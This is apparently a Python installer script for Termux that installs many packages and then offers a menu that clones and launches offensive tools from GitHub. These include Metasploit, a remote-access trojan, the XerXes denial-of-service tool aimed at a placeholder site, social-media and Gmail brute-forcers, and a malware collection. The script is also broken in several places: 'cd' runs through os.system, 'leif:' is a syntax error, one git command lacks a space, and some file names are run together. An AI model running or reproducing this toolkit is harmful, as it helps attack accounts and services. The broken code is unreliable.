import os
os.system ("clear")
os.system ("cd")
os.system ("pkg update -y")
os.system ("pkg upgrade -y")
os.system ("pkg install python -y")
os.system (" pkg install python2 -y")
os.system ("pkg install python2-dev -y")
os.system ("pkg install python3 -y")
os.system ("pkg install java -y")
os.system (" pkg install ruby -y")
os.system ("pkg install help -y")
os.system ("pkg install git -y")
os.system ("pkg install git -y")
os.system ("pkg install host -y")
os.system ("pkg install php -y")
os.system ("pkg install perl -y")
os.system (" install nmap -y")
os.system (" pkg install bash -y")
os.system ("pkg install clang -y")
os.system (" pkg install nano -y")
os.system (" pkg install w3m -y")
os.system (" install havij -y")
os.system ("pkg install hydra -y ")
os.system (" pkg install figlet -y ")
os.system (" pkg install cowsay -y ")
os.system (" pkg install curl -y ")
os.system (" pkg install tar -y ")
os.system (" pkg install zip -y ")
os.system (" pkg install unzip -y ")
os.system (" pkg install tor -y ")
os.system (" pkg install google -y ")
os.system (" pkg install sudo -y ")
os.system (" pkg install wget -y ")
os.system (" pkg install wireshark -y ")
os.system (" pkg install wgetrc -y ")
os.system ("pkg install wcalc -y ")
os.system (" pkg install bmon -y ")
os.system (" pkg install vpn -y ")
os.system (" pkg install unrar -y ")
os.system (" pkg install toilet -y ")
os.system (" pkg install proot -y ")
os.system (" pkg install net-tools -y ")
os.system (" pkg install golang -y ")
os.system (" pkg install chroot -y ")
os.system (" termux-chroot -y")
os.system (" pkg install macchanger -y ")
os.system (" pkg install openssl -y ")
os.system (" pkg install cmatrix -y ")
os.system (" pkg install openssh -y ")
os.system (" pkg install wireshark -y ")
os.system (" termux-setup-storage -y")
os.system (" pkg install macchanger -y ")
os.system (" apt  && apt upgrade -y ")
os.system ("clear")
print("1-install metasploit")
print("2-install A-rat ")
print("3-install XerXes")
print("4-install SocialBox-Termux")
print("5-install brutegmail")
print("6-install Malicious")
print("7-install theZoo")
print("8-exit")
number = input ("choose a number:")
if number == "1" :
    os.system ("cd")
    os.system ("git clone https://github.com/verluchie/termux-metasploit.git")
    os.system ("cd termux-metasploit")
    os.system ("gem install bundle")
    os.system ("gem install bundler")
    os.system ("bundle update")
    os.system ("bundle update nokogiri")
    os.system ("chmod 777 install.sh")
    os.system ("ls")
    os.system ("sh install.sh")
    os.system ("msfconsole")
elif number == "2":
     os.system("cd")
     os.system(" git clone https://github.com/Xi4u7/A-Rat")
     os.system("cd A-Rat")
     os.system("chmod +x * ")
     os.system("python2 A-Rat.py")
elif number == "3" :
     os.system("git clone https://github.com/CyberXCodder/XerXes.git")
     os.system("cd XerXes")
     os.system("gcc xerxes.c -o xerxes")
     os.system("./xerxes www.fakesite.com 80")
elif number == "4" :
     os.system("git clone https://github.com/samsesh/SocialBox-Termux.git")
     os.system("cd SocialBox-Termux")  
     os.system("chmod 777 install-sb.shSocialBox.sh")
     os.system("bash install-sb.sh")
     os.system("bash SocialBox.sh")
elif number == "5" :
    os.system(" git clonehttps://github.com/NeloF4/brutegmail")
    os.system("cd brutegmail")
    os.system("chmod 777 Hellow.py wordlist.txt")
    os.system(" python Hellow.py")
elif number == "6" :
    os.system("git clone https://github.com/MaulanaRyM/Malicious")
    os.system(" cd Malicious")
    os.system(" cd Malicious")
    os.system("chmod 777 requirements.txt malicious.py")
    os.system(" pip2 install -r requirements.txt")
    os.system("python2 malicious.py")
elif number == "7" :
    os.system("git clone https://www.github.com/ytisf/theZoo")
    os.system("cd theZoo")
    os.system("pip install --user -r requirements.txt")
    os.system("python theZoo.py ")
elif number == "8" :
    os.system("exit")
leif:
    print ("wrong number")
